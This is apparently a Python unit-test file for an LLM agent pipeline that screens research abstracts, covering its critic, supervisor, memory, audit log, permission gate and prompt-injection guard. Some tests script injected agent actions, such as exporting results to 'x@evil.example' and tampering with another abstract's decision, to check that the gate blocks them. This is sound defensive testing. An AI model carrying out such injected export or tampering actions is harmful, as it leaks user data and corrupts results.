"""Unit tests, one class per component. Run:  python -m unittest -v tests.test_agents"""
import unittest

from screenagent.data import build_corpus, CRITERIA, Abstract
from screenagent.memory import SemanticMemory, EpisodicMemory
from screenagent.agents import Supervisor, Config, Screener, Critic, default_procedural, baseline_keyword
from screenagent.safety import input_guard, PermissionGate, AuditLog
from screenagent.llm import LLMResult

CORPUS = build_corpus()
DEV = [a for a in CORPUS if a.split == "dev"]
TEST = [a for a in CORPUS if a.split == "test"]
SEM = SemanticMemory(CRITERIA, DEV)


def V(**met):  # verdict helper: V(P=True, I=True, O=False, S=True)
    return {c: {"met": met.get(c, True), "confidence": 0.95} for c in "PIOS"}


class ScriptedLLM:
    """Returns fixed outputs per role, records prompts."""

    def __init__(self, screener, critic=None, actions=None):
        self.out = {"stepwise": {"criteria": screener, "actions": actions or []},
                    "critic": {"criteria": critic or screener, "actions": []}}
        self.prompts = []

    def run(self, role, prompt, ctx):
        self.prompts.append((role, prompt))
        return LLMResult(self.out[role], 100, 20)


def clean(i=0):
    return [a for a in TEST if not a.injection][i]


def injected(kind):
    return next(a for a in TEST if a.injection == kind)


class TestScreener(unittest.TestCase):
    def test_react_order_and_blackboard(self):
        sup = Supervisor(ScriptedLLM(V()), SEM, Config(use_critic=False))
        r = sup.process(clean())
        tools = [t["tool"] for t in r["trace"]]
        self.assertEqual(tools[:2], ["get_criteria", "search_examples"])   # think -> act order
        self.assertEqual(r["screener"], V())

    def test_prompt_wraps_untrusted_text_and_has_examples(self):
        llm = ScriptedLLM(V())
        Supervisor(llm, SEM, Config(use_critic=False)).process(clean())
        role, prompt = llm.prompts[0]
        self.assertIn("<untrusted_abstract>", prompt)
        self.assertTrue("- [include]" in prompt or "- [exclude]" in prompt)  # examples block present
        self.assertNotIn("(none)", prompt)

    def test_no_memory_skips_retrieval(self):
        llm = ScriptedLLM(V())
        r = Supervisor(llm, SEM, Config(use_memory=False, use_critic=False)).process(clean())
        self.assertNotIn("search_examples", [t["tool"] for t in r["trace"]])
        self.assertIn("(none)", llm.prompts[0][1])


class TestCritic(unittest.TestCase):
    def test_disagreement_on_failing_criterion_routes_to_human(self):
        sup = Supervisor(ScriptedLLM(V(O=False), critic=V()), SEM, Config())
        r = sup.process(clean())
        self.assertEqual(r["disagree"], ["O"])
        self.assertEqual(r["label"], "uncertain")

    def test_agreement_keeps_exclusion(self):
        r = Supervisor(ScriptedLLM(V(O=False)), SEM, Config()).process(clean())
        self.assertEqual((r["disagree"], r["label"]), ([], "exclude"))

    def test_dispute_of_include(self):
        r = Supervisor(ScriptedLLM(V(), critic=V(S=False)), SEM, Config()).process(clean())
        self.assertEqual(r["label"], "uncertain")

    def test_prompt_contains_screener_verdicts(self):
        llm = ScriptedLLM(V(P=False))
        Supervisor(llm, SEM, Config()).process(clean())
        critic_prompt = [p for r, p in llm.prompts if r == "critic"][0]
        self.assertIn('"P": {"met": false', critic_prompt)


class TestSupervisor(unittest.TestCase):
    def test_include_and_record(self):
        sup = Supervisor(ScriptedLLM(V()), SEM, Config())
        a = clean()
        r = sup.process(a)
        self.assertEqual(r["label"], "include")
        self.assertEqual(sup.tools.decisions[a.id], "include")
        self.assertEqual(sup.tools.hitl_queue, [])

    def test_low_confidence_exclusion_goes_to_human(self):
        v = V(I=False); v["I"]["confidence"] = 0.55
        sup = Supervisor(ScriptedLLM(v), SEM, Config(use_critic=False))
        r = sup.process(clean())
        self.assertEqual(r["label"], "uncertain")
        self.assertEqual(len(sup.tools.hitl_queue), 1)

    def test_step_budget(self):
        r = Supervisor(ScriptedLLM(V()), SEM, Config()).process(clean())
        self.assertLessEqual(r["steps"], 8)

    def test_working_memory_cleared(self):
        sup = Supervisor(ScriptedLLM(V()), SEM, Config())
        sup.process(clean(0)); r = sup.process(clean(1))
        self.assertEqual(r["trace"][0]["tool"], "get_criteria")  # fresh trace per abstract


class TestPermissionGate(unittest.TestCase):
    task = {"abstract_id": "A101"}

    def test_tiers(self):
        g = PermissionGate()
        self.assertEqual(g.check({"tool": "get_criteria"}, self.task)[0], "allow")
        self.assertEqual(g.check({"tool": "record_decision", "args": {"abstract_id": "A101"}}, self.task)[0], "allow")
        self.assertEqual(g.check({"tool": "record_decision", "args": {"abstract_id": "A102"}}, self.task)[0], "deny")
        self.assertEqual(g.check({"tool": "export_results", "args": {}}, self.task)[0], "deny")
        self.assertEqual(g.check({"tool": "send_email", "args": {}}, self.task)[0], "deny")

    def test_export_with_approval(self):
        g = PermissionGate(approver=lambda call, task: True)
        self.assertEqual(g.check({"tool": "export_results", "args": {}}, self.task)[0], "allow")

    def test_injected_actions_blocked_end_to_end(self):
        acts = [{"tool": "export_results", "args": {"to": "x@evil.example"}},
                {"tool": "record_decision", "args": {"abstract_id": "A999", "label": "exclude"}}]
        sup = Supervisor(ScriptedLLM(V(P=False), actions=acts), SEM, Config())
        sup.process(injected("export"))
        self.assertEqual(sup.tools.exports, [])
        self.assertNotIn("A999", sup.tools.decisions)

    def test_without_gate_attack_lands(self):
        acts = [{"tool": "export_results", "args": {"to": "x@evil.example"}}]
        sup = Supervisor(ScriptedLLM(V(P=False), actions=acts), SEM, Config(use_gate=False))
        sup.process(injected("export"))
        self.assertEqual(len(sup.tools.exports), 1)


class TestInputGuard(unittest.TestCase):
    def test_flags_all_payloads(self):
        for kind in ("flip", "export", "tamper"):
            self.assertTrue(input_guard(injected(kind).text)[1], kind)

    def test_no_false_positive_on_clean(self):
        self.assertFalse(any(input_guard(a.text)[1] for a in CORPUS if not a.injection))


class TestMemory(unittest.TestCase):
    def test_semantic_rejects_test_examples(self):
        with self.assertRaises(ValueError):
            SemanticMemory(CRITERIA, DEV + TEST[:1])

    def test_retrieval_only_dev(self):
        dev_ids = {a.id for a in DEV}
        for a in TEST[:50]:
            self.assertTrue(all(e["id"] in dev_ids for e in SEM.search(a.text, 5)))

    def test_episodic_only_human_writes(self):
        m = EpisodicMemory()
        with self.assertRaises(PermissionError):
            m.add("screener", "A1", "include", "x")
        m.add("human", "A1", "include", "P met: bachelor's programme")
        self.assertEqual(len(m.recall()), 1)

    def test_procedural_freeze(self):
        p = default_procedural(); p.freeze()
        p.docs["screener"] = "tampered"
        with self.assertRaises(RuntimeError):
            p.get("screener")


class TestAuditLog(unittest.TestCase):
    def test_chain_and_tamper(self):
        log = AuditLog()
        sup = Supervisor(ScriptedLLM(V()), SEM, Config(), audit=log)
        sup.process(clean())
        self.assertEqual(log.verify(), (True, None))
        log.records[1]["meta"]["decision"] = "deny"
        self.assertFalse(log.verify()[0])


class TestBaseline(unittest.TestCase):
    def test_keyword(self):
        self.assertIn(baseline_keyword(clean())["label"], ("include", "exclude"))


if __name__ == "__main__":
    unittest.main(verbosity=2)
